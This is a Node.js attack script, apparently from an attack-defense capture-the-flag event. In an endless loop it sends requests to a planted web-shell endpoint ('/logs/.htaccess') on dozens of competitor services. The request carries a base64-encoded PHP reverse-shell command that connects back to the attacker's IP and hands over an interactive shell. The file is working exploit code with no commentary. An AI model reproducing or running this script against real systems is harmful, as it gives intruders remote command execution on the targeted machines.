// const {FormData} = require("formdata-node");
const FormData = require('form-data');
const qs = require('qs');
const fs = require("fs-extra");

const _axios = require("axios").default;
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');

function getFormData(object) {
    const formData = new FormData();
    Object.keys(object).forEach(key => formData.append(key, object[key]));
    return formData;
}

function postForm(axios, path, data){
    const form = getFormData(data);
    return axios.post(path, form, {
        headers: form.getHeaders()
    })
}

async function main(){
    for(let i = 1; i <= 42; i++){
        try {
            if (i == 22) continue;
            if (i > 1 && i <= 18) continue;
            const axios = wrapper(_axios.create({
                baseURL: `http://chals2.eof.ais3.org:${30000 + i}/`,
                jar: new CookieJar(),
                withCredentials: true,
                timeout: 1000
            }));
            const r = await axios.post("/logs/.htaccess", qs.stringify({
                p: "seadog007test1234",
                w: "echo " + Buffer.from(`php -r '$sock=fsockopen("10.14.15.119",${30000 + i});exec("sh <&3 >&3 2>&3");'`).toString('base64') + " | base64 -d | sh"
            }))
            console.log(`[v] Success: ${i}`, r.data);
        } catch (e) {
            console.log(`[x] Error: ${i}`);
        }
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

(async() => {
    while(true) {
        await main();
        await sleep(10000);
    }
})();
